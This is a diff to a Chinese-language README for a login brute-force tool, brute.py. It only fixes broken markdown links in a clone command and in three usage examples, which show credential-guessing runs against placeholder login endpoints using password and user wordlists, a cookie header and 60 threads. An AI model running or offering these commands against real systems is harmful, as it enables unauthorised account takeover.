@@ -20,7 +20,7 @@
 
 1. 克隆仓库：
 ```bash
-git clone [https://github.com/Neobee714/Neobee_Tools.git](https://github.com/Neobee714/Neobee_Tools.git)
+git clone https://github.com/Neobee714/Neobee_Tools.git
 cd Neobee_Tools
 
 ```
@@ -54,21 +54,21 @@ pip install requests
 #### 1. 针对单个用户 (admin) 进行破解
 
 ```bash
-python brute.py -u [http://target.com/login](http://target.com/login) -n admin -P pass.txt -d "username=~USER~&password=~PASS~"
+python brute.py -u http://target.com/login -n admin -P pass.txt -d "username=~USER~&password=~PASS~"
 
 ```
 
 #### 2. 使用用户列表和自定义 Header
 
 ```bash
-python brute.py -u [http://target.com/api/auth](http://target.com/api/auth) -U users.txt -P pass.txt -d "u=~USER~&p=~PASS~" -H "Cookie: session=123"
+python brute.py -u http://target.com/api/auth -U users.txt -P pass.txt -d "u=~USER~&p=~PASS~" -H "Cookie: session=123"
 
 ```
 
 #### 3. 指定线程数和攻击模式
 
 ```bash
-python brute.py -u [http://target.com/login](http://target.com/login) -n admin -P pass.txt -d "user=~USER~&pass=~PASS~" -t 60 -M USER
+python brute.py -u http://target.com/login -n admin -P pass.txt -d "user=~USER~&pass=~PASS~" -t 60 -M USER
 
 ```
 
